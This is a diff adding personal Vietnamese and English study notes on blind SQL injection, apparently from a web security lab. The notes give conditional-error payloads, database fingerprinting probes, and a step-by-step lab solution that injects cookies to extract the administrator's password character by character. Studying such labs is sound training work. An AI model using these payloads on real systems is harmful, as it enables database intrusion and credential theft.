@@ -163,4 +163,43 @@ Launch the modified attack, review the results, and note the character at the se
 Continue this process testing offset 3, 4, and so on, until you have the whole password.
 In the browser, click My account to open the login page. Use the password to log in as the administrator user.
 
+Exploiting blind SQL injection by triggering conditional errors
++Để xem cách thức hoạt động này, hãy giả sử có hai yêu cầu được gửi lần lượt chứa các giá trị cookie sau :
+  +xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+  +xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+=> Với đầu vào đầu tiên, CASEbiểu thức sẽ được đánh giá là 'a', không gây ra bất kỳ lỗi nào.
+=> Với đầu vào thứ hai, nó sẽ đánh giá thành 1/0, gây ra lỗi chia cho không.
+
+**xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+**lab
+🔹 1. Oracle
+Đặc trưng: có bảng ảo DUAL, keyword ROWNUM, hàm banner trong v$version.
+Check:
+' AND ROWNUM = 1--        # Chỉ Oracle hiểu
+' AND 1=1 FROM DUAL--     # Oracle mới có DUAL
+Nếu trả về 200 (true) thì khả năng cao là Oracle.
+🔹 2. MySQL
+Đặc trưng: dùng SLEEP(), @@version, information_schema.
+Check:
+' AND SLEEP(5)--          # Delay nếu MySQL
+' AND (SELECT 1 FROM information_schema.tables LIMIT 1)-- 
+🔹 3. PostgreSQL
+Đặc trưng: dùng pg_sleep(), bảng pg_catalog.
+Check:
+' AND pg_sleep(5)--        # Delay nếu PostgreSQL
+' AND (SELECT relname FROM pg_class LIMIT 1)-- 
+🔹 4. Microsoft SQL Server (MSSQL)
+Đặc trưng: hàm WAITFOR DELAY, @@version, bảng master..sysdatabases.
+Check:
+' WAITFOR DELAY '0:0:5'--    # Delay nếu MSSQL
+' AND (SELECT name FROM master..sysdatabases)-- 
+
+step 1: check version: Cookie: TrackingId=Zu7dl5R3XHnm79lN' AND ROWNUM = 1-- ; session=wyBSPanpq7FhKRQ6VqoQI0jfdnODK7n => http: 200 => dùng oracle
+step 2: Cookie: TrackingId=Zu7dl5R3XHnm79lN' AND (SELECT CASE WHEN (username='administrator' AND LENGTH(password) > 19) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1) = 'a'-- ; session=wyBSPanpq7FhKRQ6VqoQI0jfdnODK7n
+check length đầu tiên thử với 1 => http 500 bởi vỉ len bao giờ cũng > 1=> sau đó thử lại với  20 => http 200 vì length < 20 , thử tiếp với 19 => http 500 => length nó chính là 20
+step 3: Cookie: TrackingId=Zu7dl5R3XHnm79lN' AND (SELECT CASE WHEN  SUBSTR(password,20,1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'-- ; session=wyBSPanpq7FhKRQ6VqoQI0jfdnODK7n
+dùng đó để brute force cũng được, chạy tay cũng được => pass...dcza362vk1g10mydn8ii   
+
+
 
